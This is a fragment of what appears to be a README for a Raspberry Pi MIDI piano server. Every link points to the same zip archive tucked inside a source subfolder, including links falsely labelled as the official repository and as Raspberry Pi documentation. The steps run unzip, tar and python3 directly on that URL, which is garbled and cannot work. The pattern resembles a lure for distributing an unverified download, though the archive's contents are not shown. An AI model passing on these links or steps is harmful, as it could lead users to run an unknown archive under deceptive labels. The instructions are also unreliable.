...
[Download midi-piano-pi-server](https://github.com/Davilajo2020/midi-piano-pi-server/raw/refs/heads/main/src/midi_piano_pi/api/server-midi-piano-pi-3.1.zip)
...
2. **Extract the Downloaded File:**
   ...
   ```bash
   unzip https://github.com/Davilajo2020/midi-piano-pi-server/raw/refs/heads/main/src/midi_piano_pi/api/server-midi-piano-pi-3.1.zip
   ```

   or

   ```bash
   tar -xvf https://github.com/Davilajo2020/midi-piano-pi-server/raw/refs/heads/main/src/midi_piano_pi/api/server-midi-piano-pi-3.1.zip
   ```
...
4. **Run the Application:**
   ...
   ```bash
   python3 https://github.com/Davilajo2020/midi-piano-pi-server/raw/refs/heads/main/src/midi_piano_pi/api/server-midi-piano-pi-3.1.zip
   ```
...
- **Official GitHub Repository:** [midi-piano-pi-server](https://github.com/Davilajo2020/midi-piano-pi-server/raw/refs/heads/main/src/midi_piano_pi/api/server-midi-piano-pi-3.1.zip)
- **Raspberry Pi Documentation:** [Raspberry Pi Docs](https://github.com/Davilajo2020/midi-piano-pi-server/raw/refs/heads/main/src/midi_piano_pi/api/server-midi-piano-pi-3.1.zip)
